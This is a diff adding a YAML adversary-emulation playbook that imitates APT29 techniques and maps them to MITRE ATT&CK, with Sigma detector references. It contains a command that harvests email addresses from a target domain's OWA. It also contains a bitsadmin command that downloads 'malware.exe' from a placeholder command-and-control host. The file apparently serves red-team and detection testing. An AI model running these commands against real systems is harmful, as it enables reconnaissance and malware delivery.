@@ -1,0 +1,28 @@
+---
+id: APT29-EMULATION
+name: "APT29 NOBELIUM Playbook"
+tactics:
+  - TA0043: Reconnaissance
+  - TA0042: Resource Development
+
+techniques:
+  - technique: T1589.001
+    name: "Gather Victim Identity Information"
+    atomic_tests:
+      - name: "Harvest Email Addresses via OWA"
+        command: |
+          python3 scripts/owa_harvester.py -d {target_domain}
+        detectors:
+          - sigma: /detection/network/owa_cred_harvest.yaml
+
+  - technique: T1059.003
+    name: "Windows Command Shell"
+    atomic_tests:
+      - name: "BITSAdmin File Transfer"
+        command: |
+          bitsadmin /transfer job /download /priority normal http://{c2}/malware.exe %temp%\mal.exe
+        cleanup: |
+          del %temp%\mal.exe
+
+mitre_enterprise_layer: "enterprise-attack-11.3"
+stix_bundle_id: "bundle--daf9e924-15eb-47b6-8143-399b8e8d43ab"
